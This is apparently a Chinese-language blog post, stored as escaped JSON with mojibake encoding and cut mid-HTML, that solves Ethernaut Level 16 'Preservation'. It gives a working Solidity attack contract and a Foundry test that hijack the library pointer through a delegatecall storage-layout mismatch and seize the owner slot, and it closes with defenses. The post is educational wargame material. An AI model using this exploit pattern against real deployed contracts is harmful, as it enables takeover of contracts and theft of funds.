å…¶å®æ˜¯æˆ‘ä»¬çš„æ”»å‡»åˆçº¦çš„åœ°å€ã€‚è¿™æ¬¡è°ƒç”¨ä¼šæŠŠ `Preservation` åˆçº¦çš„ `timeZone1Library` (slot 0) ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„æ”»å‡»åˆçº¦åœ°å€ã€‚\n2.  **åˆ›å»ºæ”»å‡»åˆçº¦**: æˆ‘ä»¬çš„æ”»å‡»åˆçº¦éœ€è¦æœ‰ä¸€ä¸ª `setTime(uint)` å‡½æ•°ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªå‡½æ•°çš„å®ç°ä¸æ˜¯ä¸ºäº†è®¾ç½®æ—¶é—´ï¼Œè€Œæ˜¯ä¸ºäº†ä¿®æ”¹ `owner`ã€‚ä¸ºäº†èƒ½ä¿®æ”¹ `owner`ï¼ˆä½äº slot 2ï¼‰ï¼Œæˆ‘ä»¬çš„æ”»å‡»åˆçº¦éœ€è¦æœ‰ä¸ `Preservation` ç›¸ä¼¼çš„å­˜å‚¨å¸ƒå±€ï¼Œä½¿å¾— `owner` å˜é‡ä¹Ÿä½äº slot 2ã€‚\n3.  **ç¬¬äºŒæ¬¡è°ƒç”¨ `setFirstTime`**: ç°åœ¨ `timeZone1Library` å·²ç»æŒ‡å‘æˆ‘ä»¬çš„æ”»å‡»åˆçº¦ã€‚æˆ‘ä»¬å†æ¬¡è°ƒç”¨ `setFirstTime`ï¼Œè¿™æ¬¡ä¼ å…¥æˆ‘ä»¬è‡ªå·±çš„åœ°å€ï¼ˆ`player`ï¼‰ä½œä¸º `_timeStamp`ã€‚`delegatecall` ä¼šæ‰§è¡Œæˆ‘ä»¬æ”»å‡»åˆçº¦çš„ `setTime` å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šå°†ä¼ å…¥çš„ `_timeStamp` (æˆ‘ä»¬çš„åœ°å€) å†™å…¥ `owner` å˜é‡ï¼ˆslot 2ï¼‰ï¼Œä»è€Œä½¿æˆ‘ä»¬æˆä¸º `owner`ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\næ”»å‡»åˆçº¦çš„å­˜å‚¨å¸ƒå±€å¿…é¡»ä¸ `Preservation` å…¼å®¹ï¼Œè‡³å°‘åœ¨å‰ä¸‰ä¸ªæ§½ä½ä¸Šæ˜¯è¿™æ ·ã€‚å®ƒçš„ `setTime` å‡½æ•°è¢«è®¾è®¡ç”¨æ¥ä¿®æ”¹ `owner`ã€‚\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// æ”»å‡»åˆçº¦\ncontract Attack {\n    // ä¿æŒä¸ Preservation åˆçº¦ç›¸åŒçš„å­˜å‚¨å¸ƒå±€\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n\n    // è¿™ä¸ªå‡½æ•°ç­¾åå¿…é¡»ä¸åº“å‡½æ•°åŒ¹é…\n    // ä½†å®ç°æ˜¯æ¶æ„çš„\n    function setTime(uint256 _newOwner) public {\n        // å½“è¢« delegatecall è°ƒç”¨æ—¶ï¼Œå®ƒä¼šä¿®æ”¹ Preservation åˆçº¦çš„ slot 2\n        owner = address(uint160(_newOwner));\n    }\n}\n```\n\n### Foundry æµ‹è¯•ä»£ç \n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/16_Preservation.sol\";\n\n// æ”»å‡»åˆçº¦å®šä¹‰ (åŒä¸Š)\ncontract Attack {\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n    function setTime(uint256 _newOwner) public { owner = address(uint160(_newOwner)); }\n}\n\ncontract PreservationTest is Test {\n    Preservation instance;\n    Attack attackContract;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        \n        // éƒ¨ç½²ç›®æ ‡åˆçº¦å’Œæ”»å‡»åˆçº¦\n        LibraryContract lib = new LibraryContract();\n        instance = new Preservation(address(lib), address(lib));\n        attackContract = new Attack();\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player, player);\n\n        // æ­¥éª¤ 1: å°† timeZone1Library (slot 0) ä¿®æ”¹ä¸ºæ”»å‡»åˆçº¦çš„åœ°å€\n        instance.setFirstTime(uint256(uint160(address(attackContract))));\n        \n        // éªŒè¯ timeZone1Library æ˜¯å¦å·²æ›´æ”¹\n        assertEq(instance.timeZone1Library(), address(attackContract));\n\n        // æ­¥éª¤ 2: å†æ¬¡è°ƒç”¨ setFirstTimeï¼Œè¿™æ¬¡ä¼šæ‰§è¡Œæ”»å‡»åˆçº¦çš„ setTime å‡½æ•°\n        // å°† owner (slot 2) ä¿®æ”¹ä¸º player çš„åœ°å€\n        instance.setFirstTime(uint256(uint160(player)));\n\n        // éªŒè¯ owner æ˜¯å¦å·²æ›´æ”¹\n        assertEq(instance.owner(), player);\n\n        vm.stopPrank();\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **éƒ¨ç½²æ”»å‡»åˆçº¦**: åˆ›å»ºä¸€ä¸ªå…·æœ‰æ¶æ„ `setTime` å‡½æ•°å’Œå…¼å®¹å­˜å‚¨å¸ƒå±€çš„æ”»å‡»åˆçº¦ã€‚\n2.  **ç¬¬ä¸€æ¬¡ `setFirstTime` è°ƒç”¨**: è°ƒç”¨ `setFirstTime`ï¼Œå‚æ•°ä¸ºæ”»å‡»åˆçº¦çš„åœ°å€ã€‚è¿™ä¼šåŠ«æŒ `timeZone1Library` æŒ‡é’ˆã€‚\n3.  **ç¬¬äºŒæ¬¡ `setFirstTime` è°ƒç”¨**: å†æ¬¡è°ƒç”¨ `setFirstTime`ï¼Œå‚æ•°ä¸º `player` çš„åœ°å€ã€‚è¿™ä¼šæ‰§è¡Œæ”»å‡»åˆçº¦çš„ä»£ç ï¼Œå°† `player` çš„åœ°å€å†™å…¥ `Preservation` åˆçº¦çš„ `owner` å­˜å‚¨æ§½ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **ä½¿ç”¨ `library` å…³é”®å­—**: Solidity çš„ `library` ç±»å‹æ˜¯ä¸“é—¨ä¸ºæ­¤ç±»åŠŸèƒ½è®¾è®¡çš„ã€‚åº“æ˜¯æ— çŠ¶æ€çš„ï¼Œå¹¶ä¸”ä¸èƒ½è¢« `delegatecall` ç›´æ¥è°ƒç”¨æ¥ä¿®æ”¹çŠ¶æ€ï¼ˆé™¤éä½¿ç”¨äº†ç‰¹å®šçš„æŠ€å·§ï¼‰ã€‚å®ƒä»¬å¯ä»¥é˜²æ­¢å­˜å‚¨å¸ƒå±€å†²çªã€‚\n2.  **ç¡®ä¿å…¼å®¹çš„å­˜å‚¨å¸ƒå±€**: å¦‚æœä½ å¿…é¡»ä½¿ç”¨ `delegatecall` åˆ°ä¸€ä¸ªéåº“åˆçº¦ï¼Œè¯·åŠ¡å¿…ç¡®ä¿ä¸¤ä¸ªåˆçº¦å…·æœ‰å®Œå…¨ç›¸åŒä¸”å…¼å®¹çš„å­˜å‚¨å¸ƒå±€ã€‚ä»»ä½•å·®å¼‚éƒ½å¯èƒ½å¯¼è‡´ä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚\n3.  **ä¸è¦å°† `delegatecall` æš´éœ²ç»™ç”¨æˆ·è¾“å…¥**: é¿å…è®©ç”¨æˆ·æ§åˆ¶ `delegatecall` çš„ç›®æ ‡åœ°å€æˆ–å‚æ•°ã€‚`delegatecall` åº”è¯¥åªç”¨äºä¸å—ä¿¡ä»»å’Œç»è¿‡éªŒè¯çš„ä»£ç è¿›è¡Œäº¤äº’ã€‚\n4.  **ä½¿ç”¨ `call` è€Œä¸æ˜¯ `delegatecall`**: å¦‚æœåªæ˜¯æƒ³è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦çš„å‡½æ•°ï¼Œè€Œä¸éœ€è¦åœ¨å½“å‰åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œè¯·ä½¿ç”¨æ ‡å‡†çš„ `call`ã€‚`call` ä¼šåœ¨è¢«è°ƒç”¨åˆçº¦è‡ªå·±çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä¸ä¼šå½±å“è°ƒç”¨è€…çš„å­˜å‚¨ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **`delegatecall`**: EVM ä¸­æœ€å¼ºå¤§çš„æ“ä½œç ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æœ€å±é™©çš„ã€‚å®ƒå…è®¸ä»£ç é‡ç”¨ï¼Œä½†ä¹Ÿå¸¦æ¥äº†å­˜å‚¨æ“çºµçš„é£é™©ã€‚\n-   **å­˜å‚¨å¸ƒå±€ (Storage Layout)**: ç†è§£Solidityå¦‚ä½•å°†å˜é‡å­˜å‚¨åœ¨EVMçš„å­˜å‚¨æ§½ä¸­æ˜¯é«˜çº§æ™ºèƒ½åˆçº¦å®‰å…¨åˆ†æçš„åŸºç¡€ã€‚`forge inspect <Contract> storage-layout` æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å·¥å…·ã€‚\n-   **ç±»å‹è½¬æ¢**: å°† `address` è½¬æ¢ä¸º `uint` æ˜¯æœ¬æ¬¡æ”»å‡»çš„å…³é”®ã€‚`uint256(uint160(address))` æ˜¯å®ç°è¿™ä¸€ç‚¹çš„æ ‡å‡†æ–¹æ³•ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   `delegatecall` åœ¨è°ƒç”¨è€…çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»£ç ï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥ä¿®æ”¹è°ƒç”¨è€…çš„å­˜å‚¨ã€‚\n-   å½“è°ƒç”¨è€…å’Œè¢«è°ƒç”¨è€…çš„å­˜å‚¨å¸ƒå±€ä¸åŒ¹é…æ—¶ï¼Œ`delegatecall` ä¼šå¯¼è‡´æ„æƒ³ä¸åˆ°çš„ã€ç¾éš¾æ€§çš„çŠ¶æ€æŸåã€‚\n-   åˆçº¦çš„å­˜å‚¨æ§½æ˜¯æŒ‰é¡ºåºåˆ†é…çš„ï¼Œäº†è§£è¿™ä¸ªé¡ºåºæ˜¯é¢„æµ‹ `delegatecall` å½±å“çš„å…³é”®ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   åˆ©ç”¨ `delegatecall` å’Œä¸åŒ¹é…çš„å­˜å‚¨å¸ƒå±€æ¥è¦†ç›–åˆçº¦çš„å…³é”®çŠ¶æ€å˜é‡ï¼ˆå¦‚æŒ‡é’ˆæˆ–æ‰€æœ‰è€…åœ°å€ï¼‰ã€‚\n-   é€šè¿‡ä¸¤æ­¥æ”»å‡»ï¼Œé¦–å…ˆåŠ«æŒä»£ç æ‰§è¡Œæµï¼ˆé€šè¿‡è¦†ç›–åº“åœ°å€ï¼‰ï¼Œç„¶åæ‰§è¡Œæ¶æ„ä»£ç æ¥è·å–æƒé™ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   ä¸¥æ ¼é™åˆ¶ `delegatecall` çš„ä½¿ç”¨ã€‚\n-   ä¼˜å…ˆä½¿ç”¨ `library` å…³é”®å­—æ¥åˆ›å»ºæ— çŠ¶æ€çš„è¾…åŠ©åˆçº¦ã€‚\n-   ç¡®ä¿ `delegatecall` çš„ç›®æ ‡åˆçº¦å…·æœ‰å…¼å®¹çš„å­˜å‚¨å¸ƒå±€ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [Solidity Docs: Delegatecall / Callcode and Libraries](https://docs.soliditylang.org/en/latest/contracts.html#delegatecall-callcode-and-libraries)\n-   [Consensys: Delegatecall Vulnerabilities](https://consensys.net/diligence/blog/2019/09/delegatecall-gotchas/)","source":"_posts/ethernaut-level-16-preservation.md","raw":"---\ntitle: 'Ethernaut Level 16: Preservation - Delegatecallä¸å­˜å‚¨å¸ƒå±€æ“çºµ'\ndate: 2025-01-25 16:25:00\nupdated: 2025-01-25 16:25:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - è¿›é˜¶æ”»å‡»ç¯‡ (11-20)\ntags:\n  - Ethernaut\n  - Foundry\n  - delegatecall\n  - Storage Layout\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\nseries: Ethernaut Foundry Solutions\nexcerpt: \"æ·±å…¥å‰–æ `delegatecall` çš„å±é™©æ€§ä»¥åŠå­˜å‚¨å¸ƒå±€ä¸åŒ¹é…å¦‚ä½•å¯¼è‡´è‡´å‘½æ¼æ´ã€‚é€šè¿‡ä¸¤æ¬¡ `delegatecall` è°ƒç”¨ï¼Œå®Œå…¨æ§åˆ¶ç›®æ ‡åˆçº¦çš„ `owner`ï¼ŒæŒæ¡ Preservation å…³å¡çš„ç ´è§£æŠ€å·§ã€‚\"\n---\n\n# ğŸ¯ Ethernaut Level 16: Preservation - Delegatecallä¸å­˜å‚¨å¸ƒå±€æ“çºµ\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 16 - Preservation](https://ethernaut.openzeppelin.com/level/16)  \n> **æ”»å‡»ç±»å‹**: `delegatecall` å­˜å‚¨å¸ƒå±€æ“çºµ  \n> **éš¾åº¦**: â­â­â­â­â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\næœ¬å…³çš„ç›®æ ‡æ˜¯è·å– `Preservation` åˆçº¦çš„æ‰€æœ‰æƒï¼Œå³æˆä¸ºè¯¥åˆçº¦çš„ `owner`ã€‚\n\n![Preservation Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel16.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n`Preservation` åˆçº¦çš„ `owner` æ˜¯ç§æœ‰çš„ï¼Œå¹¶ä¸”æ²¡æœ‰ç›´æ¥çš„å‡½æ•°æ¥ä¿®æ”¹å®ƒã€‚æ¼æ´éšè—åœ¨ä½¿ç”¨ `delegatecall` çš„ `setFirstTime` å’Œ `setSecondTime` å‡½æ•°ä¸­ã€‚\n\n```solidity\ncontract Preservation {\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n    uint storedTime;\n\n    // ... constructor ...\n\n    function setFirstTime(uint _timeStamp) public {\n        timeZone1Library.delegatecall(abi.encodePacked(bytes4(keccak256(\"setTime(uint256)\")), _timeStamp));\n    }\n\n    function setSecondTime(uint _timeStamp) public {\n        timeZone2Library.delegatecall(abi.encodePacked(bytes4(keccak256(\"setTime(uint256)\")), _timeStamp));\n    }\n}\n```\n\n`delegatecall` æ˜¯ä¸€ä¸ªéå¸¸å±é™©çš„æ“ä½œç ã€‚å®ƒä¼šåœ¨è°ƒç”¨è€…åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œå¦ä¸€ä¸ªåˆçº¦çš„ä»£ç ã€‚è¿™æ„å‘³ç€ï¼Œè¢«è°ƒç”¨åˆçº¦ï¼ˆ`library`ï¼‰çš„ä»£ç å¯ä»¥ä¿®æ”¹è°ƒç”¨è€…åˆçº¦ï¼ˆ`Preservation`ï¼‰çš„å­˜å‚¨ã€‚\n\nå½“ `setFirstTime` é€šè¿‡ `delegatecall` è°ƒç”¨ `timeZone1Library` çš„ `setTime` å‡½æ•°æ—¶ï¼Œ`setTime` å‡½æ•°ä¿®æ”¹çš„å­˜å‚¨æ§½ä½æ˜¯ `Preservation` åˆçº¦çš„æ§½ä½ã€‚\n\nè®©æˆ‘ä»¬æ¯”è¾ƒä¸€ä¸‹ `Preservation` å’Œ `LibraryContract` çš„å­˜å‚¨å¸ƒå±€ï¼š\n\n| Slot | `Preservation` åˆçº¦ | `LibraryContract` åˆçº¦ |\n| :--- | :------------------ | :--------------------- |\n| 0    | `timeZone1Library`  | `storedTime`           |\n| 1    | `timeZone2Library`  | (æœªä½¿ç”¨)               |\n| 2    | `owner`             | (æœªä½¿ç”¨)               |\n| 3    | `storedTime`        | (æœªä½¿ç”¨)               |\n\nå½“ `LibraryContract.setTime(uint)` è¢« `delegatecall` è°ƒç”¨æ—¶ï¼Œå®ƒä»¥ä¸ºè‡ªå·±åœ¨ä¿®æ”¹ `storedTime`ï¼ˆä½äº slot 0ï¼‰ã€‚ä½†å®é™…ä¸Šï¼Œå®ƒä¿®æ”¹çš„æ˜¯ `Preservation` åˆçº¦çš„ slot 0ï¼Œä¹Ÿå°±æ˜¯ `timeZone1Library` çš„åœ°å€ï¼\n\nè¿™å°±ç»™äº†æˆ‘ä»¬ä¸€ä¸ªæ”»å‡»è·¯å¾„ï¼š\n\n1.  **ç¬¬ä¸€æ¬¡è°ƒç”¨ `setFirstTime`**: æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„ `_timeStamp`ï¼Œè¿™ä¸ª `_timeStamp` å…¶å®æ˜¯æˆ‘ä»¬çš„æ”»å‡»åˆçº¦çš„åœ°å€ã€‚è¿™æ¬¡è°ƒç”¨ä¼šæŠŠ `Preservation` åˆçº¦çš„ `timeZone1Library` (slot 0) ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„æ”»å‡»åˆçº¦åœ°å€ã€‚\n2.  **åˆ›å»ºæ”»å‡»åˆçº¦**: æˆ‘ä»¬çš„æ”»å‡»åˆçº¦éœ€è¦æœ‰ä¸€ä¸ª `setTime(uint)` å‡½æ•°ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªå‡½æ•°çš„å®ç°ä¸æ˜¯ä¸ºäº†è®¾ç½®æ—¶é—´ï¼Œè€Œæ˜¯ä¸ºäº†ä¿®æ”¹ `owner`ã€‚ä¸ºäº†èƒ½ä¿®æ”¹ `owner`ï¼ˆä½äº slot 2ï¼‰ï¼Œæˆ‘ä»¬çš„æ”»å‡»åˆçº¦éœ€è¦æœ‰ä¸ `Preservation` ç›¸ä¼¼çš„å­˜å‚¨å¸ƒå±€ï¼Œä½¿å¾— `owner` å˜é‡ä¹Ÿä½äº slot 2ã€‚\n3.  **ç¬¬äºŒæ¬¡è°ƒç”¨ `setFirstTime`**: ç°åœ¨ `timeZone1Library` å·²ç»æŒ‡å‘æˆ‘ä»¬çš„æ”»å‡»åˆçº¦ã€‚æˆ‘ä»¬å†æ¬¡è°ƒç”¨ `setFirstTime`ï¼Œè¿™æ¬¡ä¼ å…¥æˆ‘ä»¬è‡ªå·±çš„åœ°å€ï¼ˆ`player`ï¼‰ä½œä¸º `_timeStamp`ã€‚`delegatecall` ä¼šæ‰§è¡Œæˆ‘ä»¬æ”»å‡»åˆçº¦çš„ `setTime` å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šå°†ä¼ å…¥çš„ `_timeStamp` (æˆ‘ä»¬çš„åœ°å€) å†™å…¥ `owner` å˜é‡ï¼ˆslot 2ï¼‰ï¼Œä»è€Œä½¿æˆ‘ä»¬æˆä¸º `owner`ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\næ”»å‡»åˆçº¦çš„å­˜å‚¨å¸ƒå±€å¿…é¡»ä¸ `Preservation` å…¼å®¹ï¼Œè‡³å°‘åœ¨å‰ä¸‰ä¸ªæ§½ä½ä¸Šæ˜¯è¿™æ ·ã€‚å®ƒçš„ `setTime` å‡½æ•°è¢«è®¾è®¡ç”¨æ¥ä¿®æ”¹ `owner`ã€‚\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n// æ”»å‡»åˆçº¦\ncontract Attack {\n    // ä¿æŒä¸ Preservation åˆçº¦ç›¸åŒçš„å­˜å‚¨å¸ƒå±€\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n\n    // è¿™ä¸ªå‡½æ•°ç­¾åå¿…é¡»ä¸åº“å‡½æ•°åŒ¹é…\n    // ä½†å®ç°æ˜¯æ¶æ„çš„\n    function setTime(uint256 _newOwner) public {\n        // å½“è¢« delegatecall è°ƒç”¨æ—¶ï¼Œå®ƒä¼šä¿®æ”¹ Preservation åˆçº¦çš„ slot 2\n        owner = address(uint160(_newOwner));\n    }\n}\n```\n\n### Foundry æµ‹è¯•ä»£ç \n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/16_Preservation.sol\";\n\n// æ”»å‡»åˆçº¦å®šä¹‰ (åŒä¸Š)\ncontract Attack {\n    address public timeZone1Library;\n    address public timeZone2Library;\n    address public owner;\n    function setTime(uint256 _newOwner) public { owner = address(uint160(_newOwner)); }\n}\n\ncontract PreservationTest is Test {\n    Preservation instance;\n    Attack attackContract;\n    address player;\n\n    function setUp() public {\n        player = vm.addr(1);\n        \n        // éƒ¨ç½²ç›®æ ‡åˆçº¦å’Œæ”»å‡»åˆçº¦\n        LibraryContract lib = new LibraryContract();\n        instance = new Preservation(address(lib), address(lib));\n        attackContract = new Attack();\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player, player);\n\n        // æ­¥éª¤ 1: å°† timeZone1Library (slot 0) ä¿®æ”¹ä¸ºæ”»å‡»åˆçº¦çš„åœ°å€\n        instance.setFirstTime(uint256(uint160(address(attackContract))));\n        \n        // éªŒè¯ timeZone1Library æ˜¯å¦å·²æ›´æ”¹\n        assertEq(instance.timeZone1Library(), address(attackContract));\n\n        // æ­¥éª¤ 2: å†æ¬¡è°ƒç”¨ setFirstTimeï¼Œè¿™æ¬¡ä¼šæ‰§è¡Œæ”»å‡»åˆçº¦çš„ setTime å‡½æ•°\n        // å°† owner (slot 2) ä¿®æ”¹ä¸º player çš„åœ°å€\n        instance.setFirstTime(uint256(uint160(player)));\n\n        // éªŒè¯ owner æ˜¯å¦å·²æ›´æ”¹\n        assertEq(instance.owner(), player);\n\n        vm.stopPrank();\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **éƒ¨ç½²æ”»å‡»åˆçº¦**: åˆ›å»ºä¸€ä¸ªå…·æœ‰æ¶æ„ `setTime` å‡½æ•°å’Œå…¼å®¹å­˜å‚¨å¸ƒå±€çš„æ”»å‡»åˆçº¦ã€‚\n2.  **ç¬¬ä¸€æ¬¡ `setFirstTime` è°ƒç”¨**: è°ƒç”¨ `setFirstTime`ï¼Œå‚æ•°ä¸ºæ”»å‡»åˆçº¦çš„åœ°å€ã€‚è¿™ä¼šåŠ«æŒ `timeZone1Library` æŒ‡é’ˆã€‚\n3.  **ç¬¬äºŒæ¬¡ `setFirstTime` è°ƒç”¨**: å†æ¬¡è°ƒç”¨ `setFirstTime`ï¼Œå‚æ•°ä¸º `player` çš„åœ°å€ã€‚è¿™ä¼šæ‰§è¡Œæ”»å‡»åˆçº¦çš„ä»£ç ï¼Œå°† `player` çš„åœ°å€å†™å…¥ `Preservation` åˆçº¦çš„ `owner` å­˜å‚¨æ§½ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **ä½¿ç”¨ `library` å…³é”®å­—**: Solidity çš„ `library` ç±»å‹æ˜¯ä¸“é—¨ä¸ºæ­¤ç±»åŠŸèƒ½è®¾è®¡çš„ã€‚åº“æ˜¯æ— çŠ¶æ€çš„ï¼Œå¹¶ä¸”ä¸èƒ½è¢« `delegatecall` ç›´æ¥è°ƒç”¨æ¥ä¿®æ”¹çŠ¶æ€ï¼ˆé™¤éä½¿ç”¨äº†ç‰¹å®šçš„æŠ€å·§ï¼‰ã€‚å®ƒä»¬å¯ä»¥é˜²æ­¢å­˜å‚¨å¸ƒå±€å†²çªã€‚\n2.  **ç¡®ä¿å…¼å®¹çš„å­˜å‚¨å¸ƒå±€**: å¦‚æœä½ å¿…é¡»ä½¿ç”¨ `delegatecall` åˆ°ä¸€ä¸ªéåº“åˆçº¦ï¼Œè¯·åŠ¡å¿…ç¡®ä¿ä¸¤ä¸ªåˆçº¦å…·æœ‰å®Œå…¨ç›¸åŒä¸”å…¼å®¹çš„å­˜å‚¨å¸ƒå±€ã€‚ä»»ä½•å·®å¼‚éƒ½å¯èƒ½å¯¼è‡´ä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚\n3.  **ä¸è¦å°† `delegatecall` æš´éœ²ç»™ç”¨æˆ·è¾“å…¥**: é¿å…è®©ç”¨æˆ·æ§åˆ¶ `delegatecall` çš„ç›®æ ‡åœ°å€æˆ–å‚æ•°ã€‚`delegatecall` åº”è¯¥åªç”¨äºä¸å—ä¿¡ä»»å’Œç»è¿‡éªŒè¯çš„ä»£ç è¿›è¡Œäº¤äº’ã€‚\n4.  **ä½¿ç”¨ `call` è€Œä¸æ˜¯ `delegatecall`**: å¦‚æœåªæ˜¯æƒ³è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦çš„å‡½æ•°ï¼Œè€Œä¸éœ€è¦åœ¨å½“å‰åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œè¯·ä½¿ç”¨æ ‡å‡†çš„ `call`ã€‚`call` ä¼šåœ¨è¢«è°ƒç”¨åˆçº¦è‡ªå·±çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä¸ä¼šå½±å“è°ƒç”¨è€…çš„å­˜å‚¨ã€‚\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n-   **`delegatecall`**: EVM ä¸­æœ€å¼ºå¤§çš„æ“ä½œç ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æœ€å±é™©çš„ã€‚å®ƒå…è®¸ä»£ç é‡ç”¨ï¼Œä½†ä¹Ÿå¸¦æ¥äº†å­˜å‚¨æ“çºµçš„é£é™©ã€‚\n-   **å­˜å‚¨å¸ƒå±€ (Storage Layout)**: ç†è§£Solidityå¦‚ä½•å°†å˜é‡å­˜å‚¨åœ¨EVMçš„å­˜å‚¨æ§½ä¸­æ˜¯é«˜çº§æ™ºèƒ½åˆçº¦å®‰å…¨åˆ†æçš„åŸºç¡€ã€‚`forge inspect <Contract> storage-layout` æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å·¥å…·ã€‚\n-   **ç±»å‹è½¬æ¢**: å°† `address` è½¬æ¢ä¸º `uint` æ˜¯æœ¬æ¬¡æ”»å‡»çš„å…³é”®ã€‚`uint256(uint160(address))` æ˜¯å®ç°è¿™ä¸€ç‚¹çš„æ ‡å‡†æ–¹æ³•ã€‚\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n-   `delegatecall` åœ¨è°ƒç”¨è€…çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»£ç ï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥ä¿®æ”¹è°ƒç”¨è€…çš„å­˜å‚¨ã€‚\n-   å½“è°ƒç”¨è€…å’Œè¢«è°ƒç”¨è€…çš„å­˜å‚¨å¸ƒå±€ä¸åŒ¹é…æ—¶ï¼Œ`delegatecall` ä¼šå¯¼è‡´æ„æƒ³ä¸åˆ°çš„ã€ç¾éš¾æ€§çš„çŠ¶æ€æŸåã€‚\n-   åˆçº¦çš„å­˜å‚¨æ§½æ˜¯æŒ‰é¡ºåºåˆ†é…çš„ï¼Œäº†è§£è¿™ä¸ªé¡ºåºæ˜¯é¢„æµ‹ `delegatecall` å½±å“çš„å…³é”®ã€‚\n\n**æ”»å‡»å‘é‡**:\n-   åˆ©ç”¨ `delegatecall` å’Œä¸åŒ¹é…çš„å­˜å‚¨å¸ƒå±€æ¥è¦†ç›–åˆçº¦çš„å…³é”®çŠ¶æ€å˜é‡ï¼ˆå¦‚æŒ‡é’ˆæˆ–æ‰€æœ‰è€…åœ°å€ï¼‰ã€‚\n-   é€šè¿‡ä¸¤æ­¥æ”»å‡»ï¼Œé¦–å…ˆåŠ«æŒä»£ç æ‰§è¡Œæµï¼ˆé€šè¿‡è¦†ç›–åº“åœ°å€ï¼‰ï¼Œç„¶åæ‰§è¡Œæ¶æ„ä»£ç æ¥è·å–æƒé™ã€‚\n\n**é˜²å¾¡ç­–ç•¥**:\n-   ä¸¥æ ¼é™åˆ¶ `delegatecall` çš„ä½¿ç”¨ã€‚\n-   ä¼˜å…ˆä½¿ç”¨ `library` å…³é”®å­—æ¥åˆ›å»ºæ— çŠ¶æ€çš„è¾…åŠ©åˆçº¦ã€‚\n-   ç¡®ä¿ `delegatecall` çš„ç›®æ ‡åˆçº¦å…·æœ‰å…¼å®¹çš„å­˜å‚¨å¸ƒå±€ã€‚\n\n## ğŸ“š å‚è€ƒèµ„æ–™\n\n-   [Solidity Docs: Delegatecall / Callcode and Libraries](https://docs.soliditylang.org/en/latest/contracts.html#delegatecall-callcode-and-libraries)\n-   [Consensys: Delegatecall Vulnerabilities](https://consensys.net/diligence/blog/2019/09/delegatecall-gotchas/)","slug":"ethernaut-level-16-preservation","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpe0017bf5q1bn09pz7","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-16-Preservation-Delegatecallä¸å­˜å‚¨å¸ƒå±€æ“çºµ\"><a href=\"#ğŸ¯-Ethernaut-Level-16-Preservation-Delegatecallä¸å­˜å‚¨å¸ƒå±€æ“çºµ\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 16: Preservation - Delegatecallä¸å­˜å‚¨å¸ƒå±€æ“çºµ\"></a>ğŸ¯ Ethernaut Level 16: Preservation - Delegatecallä¸å­˜å‚¨å¸ƒå±€æ“çºµ</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a 